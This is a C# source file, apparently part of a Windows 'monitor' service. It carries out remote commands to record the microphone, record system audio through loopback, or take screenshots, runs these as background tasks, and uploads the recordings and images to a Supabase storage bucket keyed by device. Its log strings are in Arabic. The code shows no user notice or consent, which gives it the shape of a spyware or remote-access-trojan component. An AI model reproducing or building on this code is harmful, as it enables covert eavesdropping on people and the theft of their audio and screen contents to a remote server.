using System;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using MyMonitorService.Core.Config;
using MyMonitorService.Core.Network;
using MyMonitorService.Features.Audio;
using MyMonitorService.Features.RemoteCommands.Models;
using MyMonitorService.Features.ScreenCapture;

namespace MyMonitorService.Features.RemoteCommands;

public class CommandExecutor : ICommandExecutor
{
    private readonly NaudioWaveRecorder _micRecorder;
    private readonly WasapiLoopbackRecorder _loopbackRecorder;
    private readonly ScreenCaptureService _screenCaptureService;
    private readonly SupabaseStorageClient _storageClient;
    private readonly SupabaseRestClient _restClient;
    private readonly ILogger<CommandExecutor> _logger;

    public CommandExecutor(
        NaudioWaveRecorder micRecorder,
        WasapiLoopbackRecorder loopbackRecorder,
        ScreenCaptureService screenCaptureService,
        SupabaseStorageClient storageClient,
        SupabaseRestClient restClient,
        ILogger<CommandExecutor> logger)
    {
        _micRecorder = micRecorder;
        _loopbackRecorder = loopbackRecorder;
        _screenCaptureService = screenCaptureService;
        _storageClient = storageClient;
        _restClient = restClient;
        _logger = logger;
    }

    public async Task<bool> ExecuteAsync(RemoteCommand command, CancellationToken ct = default)
    {
        string cmdName = command.Command.ToUpperInvariant().Trim();
        string deviceId = !string.IsNullOrEmpty(command.DeviceId) ? command.DeviceId : DeviceIdentity.DeviceId;
        _logger.LogInformation("⚙️ جاري تنفيذ الأمر: {cmd} (ID: {id}) للجهاز {dev}", cmdName, command.Id, deviceId);

        try
        {
            switch (cmdName)
            {
                case "MIC_RECORD":
                case "RECORD":
                case "MIC":
                    int micDuration = ExtractDurationMs(command.Payload, 60000);
                    _ = Task.Run(async () =>
                    {
                        byte[]? audio = await _micRecorder.RecordAsync(micDuration, ct);
                        if (audio != null && audio.Length > 0)
                        {
                            string remoteName = $"rec_{DateTime.Now:yyyyMMdd_HHmmss}.wav";
                            await _storageClient.UploadBinaryAsync($"audio/{deviceId}/{remoteName}", audio, "audio/wav", ct);
                            await _restClient.LogRemoteAsync(deviceId, "AudioRecorder", "INFO", $"✅ Audio OK: {remoteName}", ct);
                        }
                    }, ct);
                    return true;

                case "LISTEN_START":
                case "SYSTEM_AUDIO":
                case "LOOPBACK":
                    int sysDuration = ExtractDurationMs(command.Payload, 60000);
                    _ = Task.Run(async () =>
                    {
                        byte[]? audio = await _loopbackRecorder.RecordAsync(sysDuration, ct);
                        if (audio != null && audio.Length > 0)
                        {
                            string remoteName = $"rec_loopback_{DateTime.Now:yyyyMMdd_HHmmss}.wav";
                            await _storageClient.UploadBinaryAsync($"audio/{deviceId}/{remoteName}", audio, "audio/wav", ct);
                            await _restClient.LogRemoteAsync(deviceId, "WasapiRecorder", "INFO", $"✅ Loopback Audio OK: {remoteName}", ct);
                        }
                    }, ct);
                    return true;

                case "CAPTURE":
                case "SCREENSHOT":
                    _ = Task.Run(async () =>
                    {
                        await _screenCaptureService.CaptureAndUploadAsync(deviceId, ct);
                    }, ct);
                    return true;

                case "UPDATE":
                    _logger.LogInformation("🔄 تم استلام أمر UPDATE على ويندوز (v97) — تأكيد الجاهزية.");
                    await _restClient.LogRemoteAsync(deviceId, "WindowsService", "INFO", "Windows Node received UPDATE command — current state operational", ct);
                    return true;

                default:
                    _logger.LogWarning("أمر غير معروف أو غير مدعوم على ويندوز: {cmd}", cmdName);
                    return true;
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "فشل تنفيذ الأمر {cmd}", cmdName);
            return false;
        }
    }

    private static int ExtractDurationMs(JsonElement? payload, int defaultMs)
    {
        if (payload.HasValue && payload.Value.ValueKind == JsonValueKind.Object)
        {
            if (payload.Value.TryGetProperty("duration", out var dur) && dur.ValueKind == JsonValueKind.Number)
            {
                return dur.GetInt32();
            }
            if (payload.Value.TryGetProperty("duration_ms", out var durMs) && durMs.ValueKind == JsonValueKind.Number)
            {
                return durMs.GetInt32();
            }
        }
        return defaultMs;
    }
}
